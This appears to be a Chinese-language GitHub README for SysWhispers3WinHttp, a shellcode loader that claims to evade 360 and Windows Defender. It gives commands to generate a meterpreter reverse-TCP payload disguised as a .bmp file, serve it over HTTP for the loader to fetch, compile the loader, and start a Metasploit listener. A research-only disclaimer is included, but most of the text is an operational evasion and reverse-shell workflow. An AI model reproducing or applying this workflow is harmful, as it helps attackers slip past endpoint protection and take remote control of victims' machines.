# SysWhispers3WinHttp
SysWhispers3WinHttp 基于SysWhispers3项目增添WinHttp分离加载功能并使用32位GCC进行编译，文件大小14KB，可免杀绕过360核晶防护与Defender。

## 0x01 免责声明：

该项目仅供安全研究使用，禁止使用该项目进行违法操作，否则由使用者承担全部法律及连带责任。

## 0x02 使用：

```
// 1. 使用msfvenom生成shellcode（或使用CobaltStrike生成Stageless之shellcode）
msfvenom -p windows/meterpreter_reverse_tcp lhost=192.168.1.104 lport=4444 -f raw -o test.bmp

// 2. 使用python3开启Web服务（或使用CobaltStrike之Scripted Web Delivery功能）
python3 -m http.server

// 3. 修改SysWhispers3WinHttp.c 第40行IP地址并使用32位GCC进行编译
gcc .\syscalls.c .\SysWhispers3WinHttp.c -o .\SysWhispers3WinHttp.exe -masm=intel -fpermissive -w -s -lwinhttp
```

注：32位GCC下载地址为https://master.dl.sourceforge.net/project/mingw-w64/Toolchains%20targetting%20Win32/Personal%20Builds/mingw-builds/6.4.0/threads-win32/sjlj/i686-6.4.0-release-win32-sjlj-rt_v5-rev0.7z?viasf=1


## 0x03 演示：

```
msfconsole
msf6 > use exploit/multi/handler 
msf6 exploit(multi/handler) > set payload windows/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 4444
msf6 exploit(multi/handler) > run
```

360核晶截图
![360demo](https://user-images.githubusercontent.com/128464183/226871711-0ba4d10c-188e-46de-8c4c-fd7b3693f604.PNG)

微步云沙箱截图
![image](https://user-images.githubusercontent.com/128464183/227158488-1e5434e8-1532-436d-974f-a320d754691e.png)

## 0x04 参考：
https://github.com/klezVirus/SysWhispers3

https://learn.microsoft.com/zh-cn/windows/win32/api/winhttp/nf-winhttp-winhttpconnect
